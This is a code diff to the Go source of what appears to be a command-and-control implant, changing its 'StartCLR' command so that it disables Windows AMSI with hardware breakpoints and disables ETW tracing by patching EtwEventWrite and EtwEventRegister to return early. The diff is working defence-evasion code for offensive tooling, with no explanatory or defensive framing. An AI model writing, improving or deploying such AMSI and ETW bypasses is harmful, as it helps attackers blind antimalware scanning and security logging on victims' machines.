@@ -184,12 +184,14 @@ func (c *StartCLRCommand) Execute(task structs.Task) structs.CommandResult {
 		}
 	}
 
-	// Apply Hardware Breakpoint patches (AMSI and/or ETW)
+	// Apply Hardware Breakpoint patches (AMSI only — ETW falls back to Ret Patch)
+	// ETW via HWBP (Dr1) is unsafe: Go runtime threads call EtwEventWrite during
+	// GC/scheduling, triggering the VEH handler and crashing the agent.
 	needHWBP := params.AmsiPatch == "Hardware Breakpoint" || params.EtwPatch == "Hardware Breakpoint"
 	if needHWBP {
 		output += "\n[*] Setting up Hardware Breakpoint patches...\n"
 
-		var amsiAddr, etwAddr uintptr
+		var amsiAddr uintptr
 
 		if params.AmsiPatch == "Hardware Breakpoint" {
 			addr, err := resolveFunctionAddress(amsiDllName, amsiFunc)
@@ -201,27 +203,30 @@ func (c *StartCLRCommand) Execute(task structs.Task) structs.CommandResult {
 			}
 		}
 
+		// ETW HWBP is unsafe with Go agents — fall back to Ret Patch automatically
 		if params.EtwPatch == "Hardware Breakpoint" {
-			addr, err := resolveFunctionAddress(ntdllName, etwWriteName)
+			output += "[*] ETW: Using Ret Patch (HWBP on Dr1 unsafe — Go runtime threads call EtwEventWrite)\n"
+			patchOutput, err := PerformRetPatch(ntdllName, etwWriteName)
 			if err != nil {
-				output += fmt.Sprintf("[-] Failed to resolve ETW target: %v\n", err)
+				output += fmt.Sprintf("[-] ETW Ret Patch failed: %v\n", err)
 			} else {
-				etwAddr = addr
-				output += fmt.Sprintf("[+] ETW target at 0x%X -> Dr1\n", addr)
+				etwPatched = true
+				output += patchOutput
+			}
+			patchOutput, err = PerformRetPatch(ntdllName, etwRegName)
+			if err != nil {
+				output += fmt.Sprintf("[-] EtwEventRegister Ret Patch failed: %v\n", err)
+			} else {
+				output += patchOutput
 			}
 		}
 
-		if amsiAddr != 0 || etwAddr != 0 {
-			hwbpOutput, err := SetupHardwareBreakpoints(amsiAddr, etwAddr)
+		if amsiAddr != 0 {
+			hwbpOutput, err := SetupHardwareBreakpoints(amsiAddr, 0)
 			if err != nil {
 				output += fmt.Sprintf("[-] Hardware Breakpoint setup failed: %v\n", err)
 			} else {
-				if amsiAddr != 0 {
-					amsiPatched = true
-				}
-				if etwAddr != 0 {
-					etwPatched = true
-				}
+				amsiPatched = true
 				output += hwbpOutput
 			}
 		}
